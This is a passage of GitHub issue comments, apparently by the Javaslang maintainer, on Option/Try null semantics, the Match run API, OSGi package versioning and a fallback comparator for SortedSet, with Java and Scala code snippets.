checks on the REPL I recognized that the name isEmpty might be confusing. Scala's Try does not have it.\n``` java\nscala> import scala.util.Try                                                  \nimport scala.util.Try                                                           \nscala> Try(null)                                                              \nres1: scala.util.Try[Null] = Success(null)                                      \nscala> Try(null).toOption                                                     \nres2: Option[Null] = Some(null)                                                 \nscala> Try(null).toOption.isDefined                                           \nres3: Boolean = true                                                            \nscala> Try(null).isEmpty                                                      \n:9: error: value isEmpty is not a member of scala.util.Try[Null]     \n              Try(null).isEmpty                                               \n                        ^                                                       \nscala> Try(null).toOption.isEmpty                                             \nres5: Boolean = false                                                         \n```\nI introduced Value.isEmpty() in Javaslang to model a common property of all Value types (Lazy, Option, Future, Try, Either,... and collections) that reflects ~~a 'negative'~~ the dual of the proper state, not to be confused with undefined.\nHere are some examples what isEmpty looks like for different types:\n- Option.isEmpty() == (option == Option.None.instance())\n- Either.isEmpty() == Either.isLeft()\n- Try.isEmpty() == Try.isFailure()\n- Collection.isEmpty() == (Collection.length() == 0)\n- Validation.isEmpty() == Validation.isInvalid()\n- Lazy.isEmpty() == false // by definition\nAdditionally all Values have a method Value.isDefined() == !Value.isEmpty().\nNow I see, that the name isEmpty might be confusing. But I think it is correct. Lets look at the meanings:\nA Value wraps an instance, the so called underlying value. The javadoc of Value.isEmpty() says:\n\nChecks, if this Value is empty, i.e. if the underlying value is absent.\n- If a Try computation failed, we have no resulting underlying value. We can say that the resulting Try instance is empty. Instead we have an exception.\n- If a Validation result is invalid, the Applicative did not apply a function to produce an underlying value, the result is empty. Instead we have errors of a different type.\n- A lazy value (Lazy) is always defined. The evaluation of that value is deferred.\n- A collection containing no values is empty.\n- A Future that failed is empty because it contains no result. Instead it contains the exception that occurred.\n- etc.\n\nIf we want to model the empty state as property, it needs a name. It might differ from Scala, which has no common Value type but why should we not choose the name isEmpty?\nDoes this make sense to you?\n. We should not do that. I had a use case where I needed Some<Void>. null is the only instance here of Void. As long as null is part of Java, we can't completely get rid of it without breaking the logical structure or making look things artificial.\nYou could solve your use-case by using transform instead of toOption:\njava\nTry(...).transform(self -> self.isSuccess() ? Option.of(self.get()) : Option.empty());\nor write a helper for that\n``` java\nTry(...).transform(FancyName::toOption);\nclass FancyName {\n    static Function<? super Try, ? extends Option> toOption() {\n        return it -> it.isSuccess() ? Option.of(it.get()) : Option.empty());\n    }\n}\n```\n. Yes, it is an important topic and it needs to be clarified, also in the docs.\nI will provide an example later today, currently I only have a mobile phone at hand :)\nThe main point is that we need to preserve type-consistency. null is just a value, not more, not less. If we lift it into the context of a type (/state), conversion methods need to preserve this state.\n\nWe are not allowed to change this behavior. It wouldn't be logically (and algebraically?) correct any more. The special behavior you suggested would need to be implemented for every type in order to be consistent again. But that would not be natural any more. We would break the canonical way and add our own business logic (in a technical domain) because we think it does fit better for us.\nI will give the example later...\n. These 'laws' come to my mind that should be obeyed by the toXxx conversion methods:\nFor all Javaslang Value type A, B, C and a \u2208 A:\n1) a.toA() == a\n2) a.toC() equals a.toB().toC()\n3) a equals a.toB().toA() // follows through 1) and 2)\nor at least\n1) typeOf(a.toA()) == typeOf(a)\n2) typeOf(a.toC()) equals typeOf(a.toB().toC())\nSo let's imagine we change the behavior of Try.toOption() in the way that Success(value).toOption() returns Option.of(value).\nThen Try.of(() -> null).toOption() is None.\nTry.of(() -> null).toEither().toOption() is Right(null).toOption(), which is Some(null).\nWe could now change the behavior of toOption() for every Value implementation according to your suggestion. But then we would have\n// singularity in the space-time continuum :-)\nSuccess(null).toOption().toTry() == Failure(NoSuchElementException)\nThis might not be what other users expect.\n. Example:\nIn this example I assume that there exists 3rd party code that puts null values into maps. Or at least it is not prohibited to do so.\nWhat Java currently looks like:\n``` java\nMap map = new HashMap<>();\n// == false\nmap.containsKey(1);\n// == null\nmap.get(1);\nmap.put(1, null);\n// == true\nmap.containsKey(1);\n// == null\nmap.get(1);\n```\nHow we can do better with the use of Some(null):\n``` java\nMap map = new HashMap<>();\n// = None\nsafeGet(map, 1);\nmap.put(1, null);\n// = Some(null)\nsafeGet(map, 1);\n```\nwith\njava\nstatic <K, V> Option<V> safeGet(Map<K, V> map, K key) {\n    return map.containsKey(key) ? Option.some(map.get(key)) : Option.none();\n}\nRight?\nSee also \"Your codebase looks like this\"\nAnother example is an early version of the new structural pattern matching. However, I changed this.\n. And now let's imagine we add a new Value implementation that handles specific values in a specific way (like Option handles null in a specific way).\nWe would have to pull that specific behavior into all conversion methods toXxx to meet our special requirements. This does not feel right.\nIf we act like shown in my hand-drawing, there is no room for subjective interpretation of values. It is just as it is - a value put into a context of a type.\n. The key to my thoughts is:\nI think it we cannot assume that null stands for 'absent'  or 'undefined' in every (use-)case because Java lets room for interpretation of that value.\nThat is a billion dollar mistake that is irreversible.\n. :-))\n. This is the theory behind Value: Dual category theory\n. > Sorry to throw your own quotation back at you but (I need to understand this):\nAaarrgh! Please, don't throw things at me. :-)\n\nI think it we cannot assume that null stands for 'absent' or 'undefined' in every (use-)case because Java lets room for interpretation of that value.\n\nA simple example is the only instance null of the type Void. I needed such thing as valid extension of a specific domain in pattern matching. E.g.\n- Pattern2<T1, T2> unapplies an object to Option<Tuple2<T1, T2>> (None, if the pattern is not applicable)\n- Pattern1<T> extracts Option<T> out of an object (we don't use the wrapper Tuple1<T> to save an instance)\n- Pattern0 extracts Void out of an object (theoretically it could be also Tuple0). The singleton instance Some<Void> is obtained by Option.nothing() in Javaslang. Formally an optional instance of nothing exists.\nI flatMapped over these patterns and pattern0 needed to return Some<Nothing> to make it work. Exactly these corner show me that it really makes sense to have Some(null) without it I could not model it that way.\n\nIf we don't fix this, I can't trust that the value of a Some is not null and we're back to the if (something == null) and that's a situation that I'd like to avoid (again).\n\nAs long as null exists we can't even trust that the Some itself is not a null reference.\njava\nSome<T> some = null; // ooops!\n\nIsn't the same problem to asume that None => Failure?\n\nNo, because we should not start to interpret things. The conversion needs to take place within the same space of types (the isEmpty == true space).\n\nEither is a very special type. It is a disjoint union type. It consists of two Monad types, all other Values consist only of one Monad type! ~~I just saw that my picture is terribly WRONG. The Left type is in the wrong place, sorry.~~ Either itself is not a Monad. I recently changed it to be a right-biased Either. That means we treat a Right value as defined and a Left value as empty. (But in an unbiased version both Left and Right are defined and none of them is empty.)\nThis is the reason for having toLeft(R alternative) and toRight(L alternative) conversion methods. They work like in Scala (you need to scroll down to see the methods). \nA second thing is, when we call left() or right() on an Either, we transform it to new types: LeftProjection and RightProjection. These act like the right-biased Either. From the viewpoint of a LeftProjection a Right is empty. From the viewpoint of a RightProjection a Left is empty.\nYour questions:\n1) left.toOption()\nleft is the empty state of our right-biased either, so left.toOption() is None.\n2) left.left().toOption()\nleft.left() is a LeftProjection of a Left, which is defined (and not empty) in our understanding. So left.left().toOption() is Some.\nTrust me, it works like in Scala. This projections are not every-man's stuff but it is correct.\n. Thanks @talios for the example.\n@ggalmazor You're welcome. It was fun to me having a birds-view on Javaslang and reconsolidate some concepts.\nI think also that it is the right way to forbid null values, at least in the business domain. In low, technical layers it might help to optimize code / performance when saving additional instances. But that should be the job of library designers and this implementation detail should not leak to the outside.\n@all Have a great day!\n. Thx!\n. Hi Miguel, that's really great! I'm thrilled to let the tests run this evening an I'm really looking forward to the comparison with Scala. That will be worth a nice blog post, maybe as guest post to reach more people :-)\n. @malduarte yes, we should get a clear picture. Yesterday I also thought about adding more complex measures, e.g. combined operations like adding and removing elements in one test. Also it makes sense to add real-world use-cases like solving project Euler problems. I'm looking forward to have side-by-side measures with Scala. We will take our time to understand the results.\n. thx!\n. We will not bake pattern matching into our types. Pattern matching is a feature on its own (-> separation of concerns).. Hi Martti,\nI haven't considered it yet. Looking at the Scala source, there is one wrapper WithDefault. For Scala it is possible to have only one wrapper because the higher-kinded types allow to preserve the Map type when wrapping the actual Map instance. In Java this is not possible. We would need a wrapper for each Map implementation.\nWe need to further investigate, how an implementation could look like. We should target the following:\n- Don't leak additional types (wrappers) as public API to the outside\n- Minimize the number of additional types. Currently I see HashMap.WithDefault, LinkedHashMap.WithDefault, TreeMap.WithDefault, HashMultimap.WithDefault, LinkedHashMultimap.WithDefault, TreeMultimap.WithDefault. These are necessary because of the next point:\n- This change should not affect the existing Map implementation in the way that additional instances are added if not asked for (i.e. if withDefault was not called).\n. Currently Map implements Function1 which throws if the key is not present:\njava\ninterface Map<K, V> extends Traversable<Tuple2<K, V>>, Function1<K, V> {\n    @Override\n    default V apply(K key) {\n        return get(key).getOrElseThrow(NoSuchElementException::new);\n    }\n}\nIt would be better to reflect that a Map is a partial function by returning Option<V> instead of V:\njava\ninterface Map<K, V> extends Traversable<Tuple2<K, V>>, Function1<K, Option<V>> {\n    @Override\n    default Option<V> apply(K key) {\n        return get(key);\n    }\n}\nThen withDefault could just return a total function instead of a Map:\njava\ninterface Map<K, V> extends Traversable<Tuple2<K, V>>, Function1<K, Option<V>> {\n    @Override\n    default Function1<K, V> withDefault(V defaultValue) {\n        return k -> get(key).getOrElse(defaultValue);\n    }\n}\n(Is this signature right compared to Scala? There withDefault and withDefaultValue are distinguished...)\n. Yes, that looks good! We should add these two methods.\n. Yes, we should consider it. I will take an in-depth look after the new web-page is online...\n. May we close this ticket?\n. Great! Tomorrow evening (or Saturday morning) is the day... finally :)\n. Haha, it needs to. Need someone here to kick my ass to press the button on Friday.\n. Can't believe that we go live. Must have been thousands of hours of work! The project has grown up.\n. It is ok. Once a value is captured by a state (Some/present or None/empty), the map method has to preserve that state.\nScala does behave the same:\nbash\nscala> Some(1).map(_ => null)\nres1: Option[Null] = Some(null)\nOption has to act like this because it follows the Functor laws.\nAnd yes, it makes sense that there is a Some(null) :-) There are a few use-cases where this is needed. (See a recent discussion)\nI will close this issue.\n. @manu-m I wanted to say (but forgot) that you can use flatMap to get a None if the mapped value is null:\nGiven a mapper Function<? super T, ? extends U> mapper, it looks like this:\njava\noption.flatMap(t -> Option.of(mapper.apply(t)))\nor even simpler:\njava\noption.map(mapper).flatMap(Option::of)\n. @MarkusBarthlen thanks for the kind words.\nI\u2018m afraid, we will reduce the API surface area in the upcoming 1.0 instead of adding convenience methods.\nInstead, I\u2018m still thinking about changing the semantics in order to behave like Java... \ud83d\ude43\ud83e\udd14\ud83d\udd25\nbecause the questions will remain forever from Java users. Only Scala users understand the current behavior.. @aaiezza Yes, that works fine and is a better solution!. It was ok before, Stack isn't a Seq any more. Otherwise also the return types need to be overwritten. It is just a convenience interface to augment another collection with Stack operations.\nThis PR can be closed.\nIn the case of object serialization it is sufficient if List is serializable.\n. Yep, thx!\n. Very nice, thank you!\n. Towards #1194 \n. whoops :) Initially it was val result\nThank you, will fix it\n. Thanks! Interesting that we missed that before. I will prepare a patch-branch and cherry-pick this commit.\n. Already fixed\n. Thanks! This is evil. We should report that and remove the workaround.\n. No :) I think the issue will be best resolved near time when we try to distill a minimal example (one file, using nested classes and interfaces if necessary). If there is no simple solution to do this now, we should open an issue for that.\n. Thank you! Both places are right.\n. We suggested in #1218 to drop run(Runnable) in favor of:\n``` java\n    static  Function run(Consumer<? super T> consumer) {\n        return t -> {\n            consumer.accept(t);\n            return null;\n        };\n    }\nstatic <T1, T2> BiFunction<T1, T2, Void> run(BiConsumer<? super T1, ? super T2> consumer) {\n    return (t1, t2) -> {\n        consumer.accept(t1, t2);\n        return null;\n    };\n}\n\nvoid test() {\n    Match(new Object()).of(\n            Case(instanceOf(Integer.class), run(i -> System.out.println(i))),\n            Case(instanceOf(Double.class), run(d -> System.out.println(d))),\n            Case($(), run(ignored -> { throw new NumberFormatException(); }))\n    );\n}\n\n```\nThis needs to be tested for all Consumers to ensure that there are no ambiguities.\nWhere to place the Consumers? As top-level interfaces in package javaslang or as within javaslang.API?\n. This is not a bug, the run() method has to be used in another way.\nWe must not use run() as eagerly evaluated return value:\njava\n// R Case(Pattern0<T>, R)\nCase($(o -> false), run(...))\nIn the above example run(...) is evaluated before it is checked if the pattern matches. Instead we need to define a proper function that handles a value if the pattern matches:\njava\n// R Case(Pattern0<T>, Function<T, R>)\nCase($(o -> false), o -> run(...))\nIn the above example run(...) is evaluated if and only if the pattern matches.\n\nBecause we cannot provide a Case API that forces developers to use the right variant, the run() API can be considered as unsafe. run should be deprecated\nHow can the Match API evolve in the way that we are able to run code in a Match Case (in a concise way) while staying safe?\nWe need an API that makes clear that side-effects take place, i.e. that no value is returned. This can be accomplished by adding\njava\nMatch(obj).run(cases)\nwhere we have to ensure that only cases are used that result in Runnables. I think of\njava\nMatch(obj).run(\n    Case(Pattern, () -> ...) // Runnable as return value\n    Case(Pattern, (t1, ..., tn) -> () -> {}) // curried form of a Runnable as function\n)\nI need to check if this or s.th. similar is posstible.\n. This works well, run is not evaluated eagerly:\n``` java\n@Test\npublic void shouldRunUnitOfWork() {\nclass OuterWorld {\n\n    String effect = null;\n\n    void displayHelp() {\n        effect = \"help\";\n    }\n\n    void displayVersion() {\n        effect = \"version\";\n    }\n}\n\nfinal OuterWorld outerWorld = new OuterWorld();\n\nMatch(\"-v\").of(\n        Case(isIn(\"-h\", \"--help\"), o -> run(outerWorld::displayHelp)),\n        Case(isIn(\"-v\", \"--version\"), o -> run(outerWorld::displayVersion)),\n        Case($(), o -> { throw new IllegalArgumentException(); })\n);\n\nassertThat(outerWorld.effect).isEqualTo(\"version\");\n\n}\n@Test\npublic void shouldRunWithInferredArguments() {\nclass OuterWorld {\n\n    Number effect = null;\n\n    void writeInt(int i) {\n        effect = i;\n    }\n\n    void writeDouble(double d) {\n        effect = d;\n    }\n}\n\nfinal OuterWorld outerWorld = new OuterWorld();\nfinal Object obj = .1d;\n\nMatch(obj).of(\n        Case(instanceOf(Integer.class), i -> run(() -> outerWorld.writeInt(i))),\n        Case(instanceOf(Double.class), d -> run(() -> outerWorld.writeDouble(d))),\n        Case($(), o -> { throw new NumberFormatException(); })\n);\n\nassertThat(outerWorld.effect).isEqualTo(.1d);\n\n}\n```\n. We will not push side-effecting programming.. Maybe this PR is obsolete. Please check #1216 and #1218 \n. I will close this PR. See #1216 for more information.\n. Hi @iliax, thx for using Javaslang!\nIn your example, the Case(Pattern1, R) methods are called (first two cases). Our run() currently takes only a Runnable. Given that, it is possible like this:\n``` java\n    @Test\n    public void shouldRunWithInferredArguments() {\n    class OuterWorld {\n\n        Number effect = null;\n\n        void writeInt(int i) {\n            effect = i;\n        }\n\n        void writeDouble(double d) {\n            effect = d;\n        }\n\n    }\n\n    final OuterWorld outerWorld = new OuterWorld();\n    final Object obj = .1d;\n\n    Match(obj).of(\n            Case(instanceOf(Integer.class), i -> run(() -> outerWorld.writeInt(i))),\n            Case(instanceOf(Double.class), d -> run(() -> outerWorld.writeDouble(d))),\n            Case($(), run(() -> { throw new NumberFormatException(); }))\n    ).run(); // <-- only works with current master because of a bug, see below\n\n    assertThat(outerWorld.effect).isEqualTo(.1d);\n}\n\n```\nI like your suggestion. It involves adding new run-methods\n- run(Function)\n- run(BiFunction)\n- run(...)\nBut I think these methods will be ambiguous. The compiler can't figure out which method to take when we provide a lambda or method reference. I will test a bit with it but I think it is not possible. That means that my first example is the way to go.\nNOTE: Please note that there is currently a bug that run() eagerly evaluates. It will be solved with Javaslang 2.0.2 today. See #1216\n. It seems to be possible what you suggested:\n``` java\n    static  Function run(Consumer<? super T> consumer) {\n        return t -> {\n            consumer.accept(t);\n            return null;\n        };\n    }\nstatic <T1, T2> BiFunction<T1, T2, Void> run(BiConsumer<? super T1, ? super T2> consumer) {\n    return (t1, t2) -> {\n        consumer.accept(t1, t2);\n        return null;\n    };\n}\n\n// more run methods (Consumer3, ... Consumer8)\n\nvoid test() {\n    Match(new Object()).of(\n            Case(instanceOf(Integer.class), run(i -> System.out.println(i))),\n            Case(instanceOf(Double.class), run(d -> System.out.println(d))),\n            Case($(), run(ignored -> { throw new NumberFormatException(); }))\n    ); // <-- no more run() call needed\n}\n\n```\nNow we have the option to drop the existing run method. and add these. I will wait providing the fix for #1216 . This API change has to be well thought through (and tested).\n. Match is an expression - that's the idea of functional programming.\nIt is not our intention to push side-effecting / imperative programming. That's the wrong direction and will lead to bad code.. Hi :) Thank you Eric. We've build a great release! Now I want to spend some time to write about the features.\n. Out of scope, we already have predicates that can be used as patterns.. Hi Przemek, Javaslang must stay dependency free. That's one of the few restrictions I can't give up as an API designer. I know, it sucks.\n. Hi @jest, ok, sorry that I misunderstood. Then please do it.\nGenerally I'm also conservative with adding compile time deps but I think that in this case it will help us (and the users) to make interface changes more transparent and therefore it adds value regarding production stability.\nThanks!\n. Hi @jest,\nI've read a little bit about module systems and have some thoughts:\n- I plan to create Java modules as soon as project Jigsaw is released with Java 9.\n- My vision is that Javaslang primary relys on pure Java, if possible.\n- Having two module systems in Javaslang (midterm) will be error-prone due to duplicate configuration. I hope that Jigsaw will provide a solution to derive OSGi meta data.\n- If we integrate OSGi now into Javaslang via additional dependencies and users will rely on it, it will be hard to remove it again later (when moving to Jigsaw modules).\nI have the impression that the package versioning is only a form of documentation that attempts to provide API safety. It is some kind of duplication that is error prone. E.g. what if I forget to update the version annotation? In the end there is just code, which might change over time.\nHaving only a package version change does not provide users a migration path. Release notes with migration descriptions/hints are mandantory.\nTaking this into account I think it is the best solution for Javaslang to\n- don't include the OSGi package annotations\n- use the baseline goal to document changes and compatibility issues in the release notes\nDo I miss something? What do you think about it?\n. I was concerned about having multiple versioning standards (OSGi + Jigsaw). But as long as Jigsaw is not here, it does not matter. I will take a look at it again, when Jigsaw is ready. I'm sure it will be compatible with OSGi in the sense of static package version numbers and exported APIs.\nI think also we need to be able to compare baselines. Please go on as already planned.\n. Yes. Currently we use the apache maven bundle plugin. It automatically generates:\njava\nManifest-Version: 1.0\nBnd-LastModified: 1459290180932\nBuild-Jdk: 1.8.0_74\nBuilt-By: daniel\nBundle-Description: Javaslang is a Java standard library extension built\n  for Java 8 and above.\nBundle-License: http://www.apache.org/licenses/LICENSE-2.0.txt\nBundle-ManifestVersion: 2\nBundle-Name: Javaslang\nBundle-SymbolicName: io.javaslang\nBundle-Version: 2.1.0.SNAPSHOT\nCreated-By: Apache Maven Bundle Plugin\nExport-Package: javaslang;uses:=\"javaslang.collection,javaslang.control\"\n ;version=\"2.1.0\",javaslang.collection;uses:=\"javaslang,javaslang.contro\n l\";version=\"2.1.0\",javaslang.concurrent;uses:=\"javaslang,javaslang.coll\n ection,javaslang.control\";version=\"2.1.0\",javaslang.control;uses:=\"java\n slang,javaslang.collection\";version=\"2.1.0\"\nImport-Package: javaslang,javaslang.collection,javaslang.concurrent,java\n slang.control\nRequire-Capability: osgi.ee;filter:=\"(&(osgi.ee=JavaSE)(version=1.8))\"\nTool: Bnd-3.0.0.201509101326\nPersonally I like it to keep the release version and the package versions in sync. If package versions differ I would be totally lost...\n. @talios But it is clear that there will be chaos without a proper module concept. Adding package versions is ok. With Java 9 I will revisit the versioning topic.\nExample: Changes on my current branch:\njava\n[ERROR] javaslang: Version increase required; detected 2.1.0, suggested 3.0.0\n[ERROR] javaslang.collection: Version increase required; detected 2.1.0, suggested 3.0.0\n[WARNING] javaslang.concurrent: Excessive version increase; detected 2.1.0, suggested 2.0.0\n[WARNING] javaslang.concurrent: Version has been increased but analysis detected no changes; detected 2.1.0, suggested 2.0.0\n[WARNING] javaslang.control: Excessive version increase; detected 2.1.0, suggested 2.0.0\n[WARNING] javaslang.control: Version has been increased but analysis detected no changes; detected 2.1.0, suggested 2.0.0\n[INFO] Baseline analysis complete, 2 error(s), 4 warning(s)\n. @jest Yes, my feeling says also that you are right :-) Package versions are only numbers. But they add valuable information regarding compatibility.\nI have create a PR of my local branch for review. It is still work in progress.\nSummed up changes:\n- equals and hashCode calculation of collections are re-implemented. Internal hashCode caching is removed to reduce the memory footprint. The API does not change.\n- There is one exception/API change: I want to remove the static method Traversable.hash(Iterable). It is used internally by the collection API and will be moved to the package private/internal class Collections. Maybe I will deprecate it instead of removing it immediately. But 2.0.0 is still young and I don't think people used it yet. It is very special. Better make a clear cut here and remove it.\nThe other baseline-changes are due to additions of the new Multimap collections, see #1240.\n. For now we use maven-bundle-plugin:baseline and document changes on each release. See CONTRIBUTION.md.. Hi @benoitheinrich,\nthe existing comparator is related to elements of type T. We are mapping to elements of type U, therefore we need a new comparator.\nIf no comparator is specified we take the naturalComparator for elements of type U (even if elements of U are not comparable - that's also the way java.util.SortedSet is working). We can't check the special case where T is U. So in that case flatMap(comparator, mapper) has to be called explicitely be the user:\njava\ntreeSet.flatMap(treeSet.comparator(), mapper);\nI currently can't test it but I think that is the way to go.\nThanks for the kind words :-)\nDaniel\n. Thank you @benoitheinrich, you are right. I haven't thought this through when creating the TreeSet (and TreeMap, and soon TreeMultimap) API.\nI think we can make it safe but it would change the semantics of the current implementation. We could provide another comparator that does never fail. It is important to provide a safe API, i.e. one that does not throw unexpectedly at runtime.\nIf no comparator is specified, we could chose a new comparator unordered. Even better would be to take the naturalComparator, if there exsists an order and the unordered comparator as fallback. But this is not possible in the case of empty collections where we can't take an element to check if it is comparable. Because of type erasure we are not a able to inspect the runtime element type of a collection. Also we can't take the naturalComparator by default and fall back to the unordered comparator because we would have internally to catch a ClassCastException which takes too much time.\nThe static factory methods, e.g. TreeSet.empty() et al, could still use the naturalComparator. Only flatMap et al would need to use the unordered comparator by default. I think that is a good solution. If the API docs makes it clear how it works, with an additional example (downcasting to a Set and calling flatMap), this sounds like a reasonable solution.\nWhat do you think?\n. Task: Create singleton javaslang.collection.Comparator.NoOrderComparator (see also #1227), with\njava\nint compare(Object o1, Object o2) {\n    return 0;\n}\n. Yes, great idea, I think it should be possible. Comparators are shared between different persistent versions of a collection. Empty collections never call the comparator. Once the element type is determined and therefore the comparator's state is initialized, the comparator can be shared between difference versions of the collection (e,.g. take(0) and then perend(elem) etc.).\nRegarding thread-safety I also see no problem. Even if parallel threads execute useNatural(), the returned value is defined in each case. I need to check if there are benefits when we make the instance variable volatile.\nMany thanks!\n. @ruslansennov Yes, this is evil. It can also occur when creating empty collections without specifying a Comparator.\nI think in practice it will be a rare case. However, it is still unsafe. Java is doing the same, e.g. java.util.stream.Stream.sorted().\nIn a SortedSet/Map we rely on specific behavior induced by the comparator, e.g. when calling min() and max(). The implementations of Traversable are overloaded there, relying on the RedBlackTree backend, which needs a comparator. Having no order will result in chaos.\nAlso having a Comparator with 'no order', e.g. comparison is always 0, is not a good idea in a Set. The RedBlackTree will contain at maximum 1 element then because it represents a Set and all elements are equal o_O.\nI cannot reproduce the problem with Java collections because there is no default collector that creates a SortedSet:\njava\njava.util.SortedSet<String> sortedSet = new TreeSet<>();\nsortedSet.add(\"a\");\nsortedSet.add(\"b\");\nsortedSet\n    .stream()\n    .flatMap(s -> Arrays.asList(s.hashCode()).stream())\n    .collect(Collectors.toSet()); // <-- no toSortedSet present\nI'm currently not sure, what is the best way to go on.\n. In Java we can provoke the same, but it is not so easy to do the wrong thing as with Javaslang because we have to stream/collect forth and back and implement our own collector.\nNevertheless, having a fallback that just works would be great. We cannot use a Comparator that returns 0 for all elements. Instead we can compare the hashCodes (with null values ordered first) as fallback.\nEven if there are situations that do not work (as Ruslan has shown), i favor to implement it similar to Benoits suggestion. I see no perfect solution.\nAny other thoughts?\n``` java\npackage test;\nimport java.util.Arrays;\nimport java.util.SortedSet;\nimport java.util.TreeSet;\nimport java.util.function.BiConsumer;\nimport java.util.function.BinaryOperator;\nimport java.util.function.Function;\nimport java.util.function.Supplier;\nimport java.util.stream.Collector;\npublic class JavaSortedSetTest {\npublic static void main(String[] args) {\n\n    SortedSet<String> sortedSet = new TreeSet<>();\n    sortedSet.add(\"a\");\n    sortedSet.add(\"b\");\n\n    // Exception in thread \"main\" java.lang.ClassCastException:\n    // test.JavaSortedSetTest$Obj cannot be cast to java.lang.Comparable\n    sortedSet\n        .stream()\n        .flatMap(s -> Arrays.asList(new Obj(s)).stream())\n        .collect(toSortedSet());\n}\n\nstatic <T> Collector<T, TreeSet<T>, TreeSet<T>> toSortedSet() {\n    final Supplier<TreeSet<T>> supplier = TreeSet::new;\n    final BiConsumer<TreeSet<T>, T> accumulator = TreeSet::add;\n    final BinaryOperator<TreeSet<T>> combiner = (left, right) -> {\n        left.addAll(right);\n        return left;\n    };\n    final Function<TreeSet<T>, TreeSet<T>> finisher = treeSet -> treeSet;\n    return Collector.of(supplier, accumulator, combiner, finisher);\n}\n\nstatic class Obj {\n    String s;\n    Obj(String s) {\n        this.s = s;\n    }\n}\n\n}\n``\n. Hi @kag0, thanks for your thoughts. I will come back to this issue during this week (because of too many parallel tasks already).\n- Daniel\n. I agree that the best solution is to let return our currentSortedSet.flatMap` at Set instead of a SortedSet.\nThe same applies to SortedSet.map.\nThe scan methods look like this:\n``` java\n    // DEV-NOTE: The return type is either Set or SortedSet, depending whether U is Comparable\n    @Override\n     Set scanLeft(U zero, BiFunction<? super U, ? super T, ? extends U> operation);\n// DEV-NOTE: The return type is either Set or SortedSet, depending whether U is Comparable\n@Override\n<U> Set<U> scanRight(U zero, BiFunction<? super T, ? super U, ? extends U> operation);\n\n```\nAlso these have to be revised:\n``` java\n    @Override\n     Tuple2<? extends SortedSet, ? extends SortedSet> unzip(Function<? super T, Tuple2<? extends T1, ? extends T2>> unzipper);\n@Override\n<T1, T2, T3> Tuple3<? extends SortedSet<T1>, ? extends SortedSet<T2>, ? extends SortedSet<T3>> unzip3(Function<? super T, Tuple3<? extends T1, ? extends T2, ? extends T3>> unzipper);\n\n@Override\n<U> SortedSet<Tuple2<T, U>> zip(Iterable<? extends U> that);\n\n@Override\n<U, R> SortedSet<R> zipWith(Iterable<? extends U> that, BiFunction<? super T, ? super U, ? extends R> mapper);\n\n@Override\n<U> SortedSet<Tuple2<T, U>> zipAll(Iterable<? extends U> that, T thisElem, U thatElem);\n\n@Override\nSortedSet<Tuple2<T, Integer>> zipWithIndex();\n\n@Override\n<U> SortedSet<U> zipWithIndex(BiFunction<? super T, ? super Integer, ? extends U> mapper);\n\n```\nThe above are Set methods. The same thing applies for Map methods...\nThis would be a breaking change :-/\nThe other idea was to keep the API and internally use an `unordered comparator' instead (if that is possible). Then the resulting SortedSet would be equivalent to an unordered Set.\n. > The breaking change is a tough pill.\nThat's right. We will not break anything. In fact I do not plan to break anything in near future (opposed than stated in one of my previous blog posts). I've learned that backward compatibility is the most important feature a library has.\nToday I had the idea of a lazy comparator. This will first operate on a Comparator that\n1. waits for the first non-null value to pass by\n2. checks if the value is instanceof Comparable\n3. if Yes => switches the comparator to the natural one of the value, if No => falls back to another (unordered?) comparator, e.g. comparing hashCodes!?!?\n. Hi @kag0,\nI like your idea and have made some modifications.\n- We should move null values out of the way (nulls-first strategy). \n- We should use an existing Comparator before testing for equality (which might be costly). That is how we expect a SortedSet to work by default.\n- We should take a shortcut if type(o1) == type(o2). The type comparison is fast and we may safe a second equals check, which may be cost-intensive.\n- I think the hash(o1, o2) method is a good solution as fallback for non-equal objects. (see also notes below)\n``` java\nfinal class ObjectComparator implements java.util.Comparator, Serializable {\nprivate static final long serialVersionUID = 1L;\n\nprivate static final ObjectComparator<?> INSTANCE = new ObjectComparator<>();\n\nprivate ObjectComparator() {\n}\n\n@SuppressWarnings(\"unchecked\")\nstatic <T> ObjectComparator<T> instance() {\n    return (ObjectComparator<T>) INSTANCE;\n}\n\n@Override\npublic int compare(T o1, T o2) {\n    if (o1 == o2) {\n        return 0;\n    } else if (o1 == null) {\n        return -1;\n    } else if (o2 == null) {\n        return 1;\n    } else {\n        final Class<?> type1 = o1.getClass();\n        final Class<?> type2 = o2.getClass();\n        if (type1 == type2) {\n            if (o1 instanceof Comparable) {\n                return natural(o1, o2);\n            } else if (o1.equals(o2)) {\n                return 0;\n            } else {\n                return hash(o1, o2);\n            }\n        } else {\n            if (o1 instanceof Comparable && type1.isAssignableFrom(type2)) {\n                return natural(o1, o2);\n            } else if (o2 instanceof Comparable && type2.isAssignableFrom(type1)) {\n                return -natural(o2, o1);\n            } else if (o1.equals(o2) || o2.equals(o1)) {\n                return 0;\n            } else {\n                return hash(o1, o2);\n            }\n        }\n    }\n}\n\n@SuppressWarnings(\"unchecked\")\nprivate static <T> int natural(T o1, T o2) {\n    return ((Comparable<T>) o1).compareTo(o2);\n}\n\nprivate static int hash(Object o1, Object o2) {\n    return o1.hashCode() - o2.hashCode();\n}\n\n@Override\npublic boolean equals(Object obj) {\n    return obj == this;\n}\n\n@Override\npublic String toString() {\n    return \"ObjectComparator\";\n}\n\n/**\n * Instance control for object serialization.\n *\n * @return The singleton instance of FallbackComparator.\n * @see java.io.Serializable\n */\nprivate Object readResolve() {\n    return INSTANCE;\n}\n\n}\n```\nNote: We assume that no hashCode collisions can occur, i.e. o1.hashCode() != o2.hashCode() for two different objects o1, o2. Technically we assume that the hashCode of an object corresponds to the memory address of the object. I don't know if this assumption still holds. Java's int is 32 bit, our machines address 64 bit memory. However, this problem applies to most equals methods of Javaslang.\nChecking for hashCode collisions would be problematic. The first check obj == this cannot be performed any more. If we got to the hashCode branch of our if-statement we already know that the objects are not equal. This is the reason that hash(o1, o2) has to return a value different from 0.  Because in the case of a collision the value is arbitrary, say -1, the whole order is provably arbitrary in the general case. The whole hashCode comparison makes no sense any more. What happens if we just return -1? I think the the RedBlackTree should still work.\nUpdate: I understand the // oh crud problematic. It is no viable solution to search (once) for the most common comparator of two objects o1, o2. Because beside T1 and T2 (in your example) there might be also additional types T3, T4, ... like this:\njava\n     O------------------------\n    /                         \\\n   T extends Comparable<T>     T'\n  / \\                         / \\\nT1   T2                     T3   T4\nExample:\njava\nSet<O> set = Set.of(t1, t2, t3, t4);\nwhere t1 of type T1, t2 of type T2, ...\n. ...we could search the type hierarchy\n``` java\nif (o1 instanceof Comparable) {\n    if (type1.isAssignableFrom(type2)) {\n        ...\n    } else if (getTypeThatImplementsComparable(o1).isAssignableFrom(type2)) {\n        